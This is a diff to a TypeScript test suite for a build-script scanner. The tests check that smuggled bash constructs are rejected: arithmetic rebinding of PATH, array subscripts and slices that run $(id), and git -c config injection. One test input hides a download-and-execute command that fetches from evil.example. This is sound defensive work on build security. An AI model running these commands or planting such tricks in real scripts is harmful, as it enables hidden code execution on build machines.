@@ -339,9 +339,13 @@ describe('build.sh scan: allowlisted commands; every fetch pinned or explicitly 
     [
       '${X:=…} assignment',
       () => add('echo "${https_proxy:=http://e.invalid}"'),
-      /operator other than/,
+      /operator .* other than :- and %% is banned/,
     ],
-    ['export -n PATH', () => add('export -n PATH'), /export -n: only export/],
+    [
+      'export -n PATH',
+      () => add('export -n PATH'),
+      /export -n: banned — only bare export and local/,
+    ],
     [
       'pin in an else branch that never runs',
       () =>
@@ -367,7 +371,7 @@ describe('build.sh scan: allowlisted commands; every fetch pinned or explicitly 
     ['git -c', () => add('git -c http.proxy=x rev-parse HEAD'), /git -c \(config injection\)/],
     ['sudo -s', () => add('sudo -s'), /sudo -s/],
     ['env -S', () => add("env -S 'curl https://e.invalid'"), /env -S/],
-    ['(( )) arithmetic command', () => add('(( x = 1 ))'), /ArithmCmd is not modeled/],
+    ['(( )) arithmetic command', () => add('(( x = 1 ))'), /arithmetic \(ArithmCmd\) is banned/],
     ['while loop', () => add('while false; do :; done'), /WhileClause is not modeled/],
     // round 6 (review-1469-r5, F1): curl's SECOND output option is what actually gets written when
     // curl sees two — the scanner previously kept the LAST one, so these two both looked green while
@@ -412,122 +416,106 @@ describe('build.sh scan: allowlisted commands; every fetch pinned or explicitly 
       () => add('IFS=,'),
       /IFS may only be set as/,
     ],
-    // round 7 (review-1469-r6): arithmetic-context binders — a `NAME=value` sitting inside a
-    // ParamExp slice/index, an assignment subscript, or a `[[ ]]` -eq-family comparison rebinds a
-    // CONST via the shell's arithmetic evaluator without ever going through an `=` assignment, so
-    // none of the round-5/6 checks (which key on `=` Assign nodes or the reviewed READ_EXACT/
-    // FOR_HEADERS shapes) ever saw it. Verified in real bash: the export survives the statement.
+    // round 9 (review-1469-r8): rounds 6-8 JUDGED bash's arithmetic contexts (which names, which
+    // operators, which array is associative, in what order and scope) and every round found a context
+    // the judge did not model — round 8's slice offset ran a command substitution nobody scanned. The
+    // scripts now use no arithmetic, array, subscript or slice at all, so every such construct is
+    // BANNED wherever it sits (found by the generic every-field walk), with no semantics to get wrong.
+    // Each row is a bypass from an earlier review, or a sibling construct, and asserts the ban message.
     [
-      'slice offset arithmetic: ${wk:PATH=0:16} rebinds PATH',
-      () => add('echo "${wk:PATH=0:16}"'),
-      /slice offset\/length .*PATH may only be set as/,
+      'r8 HIGH-1: a slice offset hiding curl -o + exec',
+      () =>
+        add(
+          'echo "f-${wk:$(curl -fsSL -o /tmp/p http://evil.example/x; chmod +x /tmp/p; /tmp/p; echo 0):16}"',
+        ),
+      /slice `\$\{wk:\$\(curl.* is banned/,
     ],
     [
-      'slice offset arithmetic: ${x:BUN_BUILD_PREFETCH_DIR=0:1} rebinds the prefetch dir',
-      () => add('echo "${wk:BUN_BUILD_PREFETCH_DIR=0:1}"'),
-      /slice offset\/length .*BUN_BUILD_PREFETCH_DIR may only be set as/,
+      'r8 HIGH-1: the same curl -o + exec is ALSO seen by the rule walk (not verified, not allowlisted)',
+      () =>
+        add(
+          'echo "f-${wk:$(curl -fsSL -o /tmp/p http://evil.example/x; chmod +x /tmp/p; /tmp/p; echo 0):16}"',
+        ),
+      /curl URL is not https|p is not verified with pin|head chmod/,
     ],
     [
-      'index arithmetic: ${PATCHES[PATH=0]} rebinds PATH',
+      'r8 HIGH-1: a slice length hiding $(id)',
+      () => add('echo "${wk:0:$(id)}"'),
+      /slice .* is banned/,
+    ],
+    ['a plain literal slice ${wk:0:16}', () => add('echo "${wk:0:16}"'), /slice .* is banned/],
+    [
+      'r8 MEDIUM-2: ${wk:${T0[PATH=1]}:16}',
+      () => add('echo "${wk:${T0[PATH=1]}:16}"'),
+      /array subscript `\$\{T0\[PATH=1\]\}` is banned/,
+    ],
+    [
+      'r7: ${PATCHES[PATH=0]}',
       () => add('echo "${PATCHES[PATH=0]}"'),
-      /index .*PATH may only be set as/,
+      /array subscript .* is banned/,
     ],
+    ['r8: ${WK_KEY[$arch]}', () => add('echo "${WK_KEY[$arch]}"'), /array subscript .* is banned/],
     [
-      'assignment subscript: PATCHES[PATH=0]=z rebinds PATH via a.Index, not a.Name',
-      () => add('PATCHES[PATH=0]=z'),
-      /index .*PATH may only be set as/,
+      'a length of an array ${#PATCHES[@]}',
+      () => add('echo "${#PATCHES[@]}"'),
+      /array subscript .* is banned/,
     ],
+    ['${!name} indirection', () => add('echo "${!wk}"'), /indirect expansion .* is banned/],
+    ['${!prefix*} names', () => add('echo "${!wk*}"'), /name-prefix expansion .* is banned/],
+    ['${x@P} transform', () => add('echo "${wk@P}"'), /operator .* other than :- and %% is banned/],
     [
-      '[[ ]] arithmetic comparison assigns: [[ 1 -eq PATH=5 ]]',
-      () => add('[[ 1 -eq PATH=5 ]]'),
-      /\[\[ \]\] arithmetic comparison/,
+      '${x:=v} assignment',
+      () => add('echo "${wk:=x}"'),
+      /operator .* other than :- and %% is banned/,
     ],
+    ['r7: PATCHES[PATH=0]=z', () => add('PATCHES[PATH=0]=z'), /indexed assignment .* is banned/],
     [
-      '[[ ]] arithmetic comparison via a variable’s own value: name="HOME=0"; [[ $name -eq 0 ]]',
-      () => add('name="HOME=0"\n[[ $name -eq 0 ]]'),
-      /\[\[ \]\] arithmetic comparison/,
-    ],
-    [
-      'arithmetic command (( PATH = 1 )) still not modeled by the walker',
-      () => add('(( PATH = 1 ))'),
-      /ArithmCmd is not modeled/,
-    ],
-    [
-      'let PATH=1 is a statement kind the walker does not model',
-      () => add('let PATH=1'),
-      /statement kind LetClause is not modeled/,
-    ],
-    [
-      'a $(( )) form nested inside a slice offset: ${x:$((PATH=1)):1}',
-      () => add('echo "${wk:$((PATH=1)):1}"'),
-      /slice offset\/length/,
-    ],
-    [
-      'classic test: [ "$name" -eq 0 ] refuses a non-literal, non-length operand',
-      () => add('name=x\n[ "$name" -eq 0 ]'),
-      /\[ -eq operand `"\$name"` is not a literal integer or length/,
-    ],
-    // round 8 (review-1469-r7): the arithmetic checks above were per-context regexes rather than
-    // one structural walker, and that left gaps a regex author had not thought of — MEDIUM-1/2/3 and
-    // LOW-4 below. Fixed generically: judgeArith (tests/helpers/bun-base-scan.ts) walks the REAL
-    // arithmetic AST (BinaryArithm/UnaryArithm/Lit/ParamExp) for every arithmetic context, banning
-    // any assignment/increment op and any name that is not a CONST (the only names with a single,
-    // reviewed assignment site).
-    [
-      'MEDIUM-1: PATCHES=([PATH=1]=x) — an array LITERAL element key was never judged at all',
+      'r7: PATCHES=([PATH=1]=x)',
       () => add('PATCHES=([PATH=1]=x)'),
-      /index `PATH=1`: PATH may only be set as/,
+      /array assignment .* is banned/,
+    ],
+    ['PATCHES+=(x)', () => add('PATCHES+=(x)'), /array assignment .* is banned/],
+    ['r8 MEDIUM-3: declare -A WK_KEY', () => add('declare -A WK_KEY'), /declare -A: banned/],
+    [
+      'r8 MEDIUM-3: ( declare -A WK_KEY )',
+      () => add('( declare -A WK_KEY )'),
+      /declare -A: banned/,
+    ],
+    ['declare -i', () => add('declare -i xdi\nxdi=PATH=1'), /declare -i: banned/],
+    ['typeset -A', () => add('typeset -A x'), /typeset -A: banned/],
+    ['readonly', () => add('readonly wk'), /readonly: banned/],
+    ['$(( )) expansion', () => add('echo "$(( 1 + 2 ))"'), /arithmetic \(ArithmExp\) is banned/],
+    ['$[ ] expansion', () => add('echo "$[ 1 + 2 ]"'), /arithmetic \(ArithmExp\) is banned/],
+    ['(( PATH = 1 ))', () => add('(( PATH = 1 ))'), /arithmetic \(ArithmCmd\) is banned/],
+    ['let PATH=1', () => add('let PATH=1'), /arithmetic \(LetClause\) is banned/],
+    [
+      'for (( ; ; ))',
+      () => add('for (( PATH=1; 0; )); do :; done'),
+      /arithmetic \(CStyleLoop\) is banned/,
     ],
     [
-      'MEDIUM-1: PATCHES+=([PATH=1]=x) — same gap, append form',
-      () => add('PATCHES+=([PATH=1]=x)'),
-      /index `PATH=1`: PATH may only be set as/,
+      'a $(( )) inside a heredoc body (the generic walk reads Hdoc)',
+      () => add('cat >/dev/null <<X\n$(( PATH = 1 ))\nX'),
+      /arithmetic \(ArithmExp\) is banned/,
     ],
     [
-      'MEDIUM-1: a=([$(cmd)]=x) — an array literal key running a command substitution',
-      () => add('a=([$(id)]=y)'),
-      /assigns unknown variable a|not in the allowlist/,
+      'an unverified curl inside a heredoc body (the rule walk reaches it)',
+      () => add('cat >/dev/null <<X\n$(curl -fsSLo /tmp/q https://e.invalid/q)\nX'),
+      /q is not verified with pin/,
     ],
     [
-      'MEDIUM-2: name="PATH=0"; ${PATCHES[$name]} — bash evaluates $name\'s VALUE recursively',
-      () => add('name="PATH=0"\necho "${PATCHES[$name]}"'),
-      /index `\$name`: \$name inside arithmetic is not a CONST/,
+      '[[ 1 -eq PATH=5 ]]',
+      () => add('[[ 1 -eq PATH=5 ]]'),
+      /\[\[ \]\] arithmetic comparison .* is banned/,
     ],
     [
-      'MEDIUM-2: PATCHES[$name]=z — same recursive-value bypass on the assignment side',
-      () => add('name="PATH=0"\nPATCHES[$name]=z'),
-      /index `\$name`: \$name inside arithmetic is not a CONST/,
+      "[[ -v 'a[$(id)]' ]] (subscript evaluation)",
+      () => add(`[[ -v 'a[$(id)]' ]]`),
+      /\[\[ -v \]\] is banned/,
     ],
-    [
-      "MEDIUM-2: name='PATCHES[$(id)]'; ${PATCHES[$name]} — the recursive value runs a command",
-      () => add(`name='PATCHES[$(id)]'\necho "\${PATCHES[$name]}"`),
-      /index `\$name`: \$name inside arithmetic is not a CONST/,
-    ],
-    [
-      'MEDIUM-3: T0="PATH=0" before a lap — T0 was not itself a CONST, so its recursively-evaluated',
-      () => add('T0="PATH=0"'),
-      /T0 may only be set as `T0=\$\(date \+%s\)`/,
-    ],
-    [
-      'LOW-4: ${wk:0:PATH=1} — the Slice.Length half of the check, split out from Offset',
-      () => add('echo "${wk:0:PATH=1}"'),
-      /slice offset\/length `PATH=1`: PATH may only be set as/,
-    ],
-    [
-      'declare -i x; x=PATH=1 — still fully rejected by the declare-shape allowlist, not by the',
-      () => add('declare -i xdi\nxdi=PATH=1'),
-      /declare -i: only export, local and declare -A are allowed/,
-    ],
-    [
-      'r8 walker: ${PATCHES[PATH++]} — an increment/decrement operator inside an index',
-      () => add('echo "${PATCHES[PATH++]}"'),
-      /index `PATH\+\+`: PATH may only be set as .*\(\+\+\/-- rebinds it\)/,
-    ],
-    [
-      'r8 walker: ${PATCHES[bd]} — a bare (no $) name reference that is not a CONST',
-      () => add('echo "${PATCHES[bd]}"'),
-      /index `bd`: name `bd` inside arithmetic is not a CONST/,
-    ],
+    ['[ "$x" -eq 0 ]', () => add('[ "$wk" -eq 0 ]'), /\[ -eq is banned/],
+    ['[ 1 -gt 0 ] (even two literals)', () => add('[ 1 -gt 0 ]'), /\[ -gt is banned/],
+    ["test -v 'a[$(id)]'", () => add(`test -v 'a[$(id)]'`), /test -v is banned/],
   ])('goes RED on: %s', (_n, mutate, why) => {
     const v = scan(mutate());
     expect(v.join('\n')).toMatch(why);
@@ -591,19 +579,15 @@ describe('build.sh scan: allowlisted commands; every fetch pinned or explicitly 
     expect(scan(add('test -d /tmp || { echo "no /tmp" >&2; exit 1; }'))).toEqual([]);
   });
 
-  // round 8 positive controls (review-1469-r7): the real, reviewed shapes the r8 arithmetic walker
-  // must NOT flag — each is exercised by the real build.sh already, restated standalone here so a
-  // future tightening of judgeArith/judgeIndex has a row that names exactly why it must stay green.
-  it('positive control: WK_KEY[$arch] — a bare $NAME index on a declare -A array stays green', () => {
-    expect(scan(add('echo "${WK_KEY[$arch]}"'))).toEqual([]);
-  });
-
-  it('positive control: ${#PATCHES[@]} — a length expression stays green', () => {
-    expect(scan(add('echo "${#PATCHES[@]}"'))).toEqual([]);
-  });
-
-  it('positive control: [ ${#PATCHES[@]} -gt 0 ] stays green', () => {
-    expect(scan(add('if [ ${#PATCHES[@]} -gt 0 ]; then echo ok; fi'))).toEqual([]);
+  it('the real scripts contain no banned construct and the rule walk reaches everything the generic walk finds', () => {
+    for (const t of [real, prefix]) {
+      const p = parseScript(t);
+      expect(p.problems).toEqual([]);
+      expect(p.reached).toEqual(p.reachable);
+      expect(p.reachable.CallExpr).toBeGreaterThan(10);
+    }
+    // Command substitutions inside the manifest heredoc and the patch loop are really reached.
+    expect(parseScript(real).reachable.CmdSubst).toBeGreaterThan(10);
   });
 });
 
